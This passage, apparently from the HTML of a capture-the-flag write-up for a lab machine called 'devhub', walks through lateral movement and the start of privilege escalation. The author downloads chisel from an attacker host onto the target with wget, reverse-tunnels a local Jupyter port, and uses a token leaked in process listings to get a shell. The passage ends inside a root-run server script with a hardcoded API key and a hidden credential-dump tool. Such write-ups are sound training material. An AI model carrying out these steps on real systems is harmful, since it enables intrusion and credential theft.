+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mcp-dev@devhub:~$ ss -tlnp
+</span></span><span style="display:flex;"><span>State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">511</span>                0.0.0.0:6274             0.0.0.0:*        users:<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;node-MainThread&#34;</span>,pid<span style="color:#f92672">=</span>1287,fd<span style="color:#f92672">=</span>29<span style="color:#f92672">))</span>                                     
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">511</span>                0.0.0.0:80               0.0.0.0:*                                                                                       
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>                0.0.0.0:22               0.0.0.0:*                                                                                       
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>         127.0.0.53%lo:53               0.0.0.0:*                                                                                       
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>              127.0.0.1:5000             0.0.0.0:*                                                                                       
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>              127.0.0.1:8888             0.0.0.0:*                                                                                       
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>                   <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:22                  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:* </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The ports that I haven&rsquo;t yet explored were ports <strong>5000</strong> and <strong>8888</strong>. I went ahead and uploaded the <strong>chisel</strong> script from my attacker machine onto the target, to use as a tunneling agent:<br>
+ <br>
+First, needed to setup an <strong>http server</strong> to serve the script from my attacker:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Scripts<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# python3 -m http.server
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Then, I grabbed the <strong>chisel</strong> script on the target and made it executable:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mcp-dev@devhub:~$ wget http://10.10.16.192:8000/chisel <span style="color:#f92672">&amp;&amp;</span> chmod +x chisel</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Once that was complete, I ran the <strong>chisel server</strong> from my attacker:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿esteban<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Scripts<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# chisel server -p <span style="color:#ae81ff">8000</span> --reverse
+</span></span><span style="display:flex;"><span>2026/06/24 16:57:47 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2026/06/24 16:57:47 server: Fingerprint Ob1WDAOoieLOxWIAWPVfhwTFKyIr9S/0zaZ2W8mDHxw<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2026/06/24 16:57:47 server: Listening on http://0.0.0.0:8000</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>And tunneled port <strong>8888</strong> from the target to my attacker, to make it accessible in a web browser:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mcp-dev@devhub:~$ ./chisel client 10.10.16.192:8000 R:8888:localhost:8888
+</span></span><span style="display:flex;"><span>2026/06/24 23:59:30 client: Connecting to ws://10.10.16.192:8000
+</span></span><span style="display:flex;"><span>2026/06/24 23:59:31 client: Connected <span style="color:#f92672">(</span>Latency 81.178806ms<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Visiting the <strong>http://localhost:8888</strong> URL brought me to this page:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/devhub/jupyter.png" loading="lazy" decoding="async"
+  alt="jupyter">
+It was a <strong>jupyter</strong> login page, with <strong>token authentication</strong> enabled. I tried using a couple of different default password to sign-in to the dashboard but had no success. So, I shifted my focus and searched for tokens on the target machine instead.<br>
+ <br>
+My user wasn&rsquo;t able to access anything <strong>jupyter</strong> related, and running <strong>find / -name jupyter 2&gt;/dev/null</strong> came up empty. I had a feeling that the service was running as the <strong>analyst</strong> user, so I checked what processes were running as them:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mcp-dev@devhub:~$ ps aux | grep analyst
+</span></span><span style="display:flex;"><span>analyst     <span style="color:#ae81ff">1081</span>  0.2  2.5 <span style="color:#ae81ff">335860</span> <span style="color:#ae81ff">103916</span> ?       Ssl  Jun24   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip<span style="color:#f92672">=</span>127.0.0.1 --port<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> --no-browser --notebook-dir<span style="color:#f92672">=</span>/home/analyst/notebooks --ServerApp.token<span style="color:#f92672">=</span>a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password<span style="color:#f92672">=</span> --ServerApp.allow_origin<span style="color:#f92672">=</span> --ServerApp.disable_check_xsrf<span style="color:#f92672">=</span>False
+</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">1089</span>  0.0  0.7  <span style="color:#ae81ff">37376</span> <span style="color:#ae81ff">28904</span> ?        Ss   Jun24   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+</span></span><span style="display:flex;"><span>mcp-dev     <span style="color:#ae81ff">1633</span>  0.0  0.0   <span style="color:#ae81ff">6828</span>  <span style="color:#ae81ff">2064</span> pts/1    S+   00:05   0:00 grep --color<span style="color:#f92672">=</span>auto analyst</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Sure enough, I struck gold! (scroll right to see the full output of the command- which revealed an <em>exposed token</em>)<br>
+ <br>
+Checking the services revealed the token I needed to sign into the dashboard, and after using successfully logging in, I was met with this page:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/devhub/analyst.png" loading="lazy" decoding="async"
+  alt="analyst dashboard">
+I wasted no time and immediately clicked on the <strong>Terminal</strong> icon:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/devhub/shell.png" loading="lazy" decoding="async"
+  alt="analyst shell">
+Boom! We&rsquo;ve got a shell as the <strong>analyst</strong> user!<br>
+ <br>
+The home directory of this user also had the <strong>user.txt</strong> flag:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:~$ ls
+</span></span><span style="display:flex;"><span>jupyter-env  notebooks  user.txt
+</span></span><span style="display:flex;"><span>analyst@devhub:~$ cat user.txt
+</span></span><span style="display:flex;"><span>a0800a178755abfdbec155e3a58ef044</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>With that out the way, it was time to get <strong>root</strong>. I started off doing my manual enumeration process, and when running the <strong>find / -name jupyter 2&gt;/dev/null</strong> command again, this time I got shown a few directories worth checking:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:~$ find / -name jupyter 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/home/analyst/jupyter-env/bin/jupyter
+</span></span><span style="display:flex;"><span>/home/analyst/jupyter-env/etc/jupyter
+</span></span><span style="display:flex;"><span>/home/analyst/jupyter-env/share/jupyter
+</span></span><span style="display:flex;"><span>/home/analyst/.local/share/jupyter</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I wondered if the service was running as <strong>root</strong>, so I did a quick check of running processes:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:~$ ps aux | grep jupyter
+</span></span><span style="display:flex;"><span>analyst     <span style="color:#ae81ff">1081</span>  0.1  2.6 <span style="color:#ae81ff">410908</span> <span style="color:#ae81ff">105404</span> ?       Ssl  Jun24   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip<span style="color:#f92672">=</span>127.0.0.1 --port<span style="color:#f92672">=</span><span style="color:#ae81ff">8888</span> --no-browser --notebook-dir<span style="color:#f92672">=</span>/home/analyst/notebo
+</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">1089</span>  0.0  0.7  <span style="color:#ae81ff">37376</span> <span style="color:#ae81ff">28904</span> ?        Ss   Jun24   0:00 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
+</span></span><span style="display:flex;"><span>analyst     <span style="color:#ae81ff">1769</span>  0.0  0.0   <span style="color:#ae81ff">6480</span>  <span style="color:#ae81ff">2304</span> pts/2    S+   00:13   0:00 grep --color<span style="color:#f92672">=</span>auto jupyter</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p><strong>There it is</strong>. The <strong>/opt/opsmcp/server.py</strong> script runs as <strong>root</strong>! I went ahead and changed directories to <strong>/opt/opsmcp/</strong> to see what I was dealing with:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:~$ cd /opt/opsmcp/
+</span></span><span style="display:flex;"><span>analyst@devhub:/opt/opsmcp$ cat server.py
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OPSMCP - Operations MCP Server
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Internal tool for system operations management
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>from flask import Flask, jsonify, request
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask<span style="color:#f92672">(</span>__name__<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># API Key for authentication</span>
+</span></span><span style="display:flex;"><span>VALID_API_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;opsmcp_secret_key_4f5a6b7c8d9e0f1a&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Registered tools (visible)</span>
+</span></span><span style="display:flex;"><span>VISIBLE_TOOLS <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops.system_status&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Get system status and health metrics&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops.list_services&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;List running services&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops.check_disk&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Check disk usage&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops.view_logs&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;View recent system logs&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;service&#34;</span>: <span style="color:#e6db74">&#34;string&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Hidden tools (not in /tools/list but callable)</span>
+</span></span><span style="display:flex;"><span>HIDDEN_TOOLS <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops._admin_dump&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Emergency credential dump - INTERNAL ONLY&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;string&#34;</span>, <span style="color:#e6db74">&#34;confirm&#34;</span>: <span style="color:#e6db74">&#34;boolean&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ops._debug_mode&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Enable debug mode&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;parameters&#34;</span>: <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ALL_TOOLS <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>**VISIBLE_TOOLS, **HIDDEN_TOOLS<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def check_auth<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Check API key authentication&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    api_key <span style="color:#f92672">=</span> request.headers.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;X-API-Key&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> api_key <span style="color:#f92672">==</span> VALID_API_KEY
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>def index<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;server&#34;</span>: <span style="color:#e6db74">&#34;OPSMCP&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;version&#34;</span>: <span style="color:#e6db74">&#34;2.1.0&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;operational&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;endpoints&#34;</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/tools/list&#34;</span>, <span style="color:#e6db74">&#34;/tools/call&#34;</span>, <span style="color:#e6db74">&#34;/health&#34;</span><span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;auth&#34;</span>: <span style="color:#e6db74">&#34;Required - X-API-Key header&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/health&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>def health<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;healthy&#34;</span>, <span style="color:#e6db74">&#34;uptime&#34;</span>: <span style="color:#e6db74">&#34;14d 3h 22m&#34;</span><span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/tools/list&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>def list_tools<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> not check_auth<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Valid X-API-Key header required&#34;</span><span style="color:#f92672">})</span>, <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;tools&#34;</span>: list<span style="color:#f92672">(</span>VISIBLE_TOOLS.keys<span style="color:#f92672">())</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;count&#34;</span>: len<span style="color:#f92672">(</span>VISIBLE_TOOLS<span style="color:#f92672">)</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;details&#34;</span>: VISIBLE_TOOLS
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/tools/call&#39;</span>, methods<span style="color:#f92672">=[</span><span style="color:#e6db74">&#39;POST&#39;</span><span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>def call_tool<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> not check_auth<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Unauthorized&#34;</span>, <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Valid X-API-Key header required&#34;</span><span style="color:#f92672">})</span>, <span style="color:#ae81ff">401</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request.get_json<span style="color:#f92672">()</span> or <span style="color:#f92672">{}</span>
+</span></span><span style="display:flex;"><span>    tool_name <span style="color:#f92672">=</span> data.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;name&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> data.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;arguments&#39;</span>, <span style="color:#f92672">{})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> not tool_name:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Tool name required&#34;</span><span style="color:#f92672">})</span>, <span style="color:#ae81ff">400</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tool_name not in ALL_TOOLS:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;error&#34;</span>: f<span style="color:#e6db74">&#34;Unknown tool: {tool_name}&#34;</span><span style="color:#f92672">})</span>, <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Execute tool</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops.system_status&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
